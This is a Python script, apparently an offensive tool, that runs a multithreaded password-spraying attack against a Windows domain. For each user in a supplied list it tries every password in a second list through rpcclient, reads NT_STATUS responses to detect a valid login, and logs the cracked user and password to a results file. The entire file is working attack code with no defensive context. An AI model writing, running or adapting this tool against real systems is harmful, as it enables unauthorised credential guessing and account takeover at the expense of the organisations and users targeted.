# /bin/bash

import os
import sys
import threading


class PassSpray:

    def __init__(self):
        try:
            self.domain = sys.argv[1]
        except:
            self.domain = ""
        try:
            self.userlist = sys.argv[2]
        except:
            self.userlist = ""
        try:
            self.passlist = sys.argv[3]
        except:
            self.passlist = ""
        try:
            self.host = sys.argv[4]
        except:
            self.host = ""

    def main(self):
        try:
            self.helper(sys.argv[1])
        except Exception:  # if no help requested, progress with normal app flow
            self.thredder()

    def thredder(self):  # Multi threader
        userlist = open(self.userlist, "r").read()
        for user in userlist.split("\n"):
            if user != "":  # if user is not blank
                print(user)
                x = threading.Thread(target=self.pew, args=(user,))
                x.start()

    def pew(self, user):  # Execute the password spray attack

        print("Starting new Thread for " + user)

        passlist = open(self.passlist, "r").read()
        for password in passlist.split("\n"):
            pewpew = os.popen("rpcclient -U \"" + self.domain + "\\" + user + "%" + password +
                              "\" -c \"getusername;quit\" " + self.host).read()

            print("Trying " + user + ": " + password)

            if "NT_STATUS_LOGON_FAILURE" in str(pewpew) or "NT_STATUS_IO_TIMEOUT" in str(pewpew) or \
                    "NT_STATUS_RESOURCE_NAME_NOT_FOUND" in str(pewpew) \
                    or "NT_STATUS_CONNECTION_RESET" in str(pewpew):
                continue
            else:
                success = open("spray_results.txt", "a")
                success.write(pewpew + "\n")  # Records server response as well in case false positive
                success.write("Match! \nUser: " + user + "\nPassword: " + password + "\n\n")
                success.close()
                print("Match! \nUser: " + user + "\nPassword: " + password)
                exit()

    def helper(self, trigger):  # Will print help when requested
        if trigger == "-h":
            print("Ex. pass_spray.py <domain> <path_to_userlist> <path_to_passlist> <ip or hostname>")
        else:
            raise Exception


run = PassSpray()
run.main()
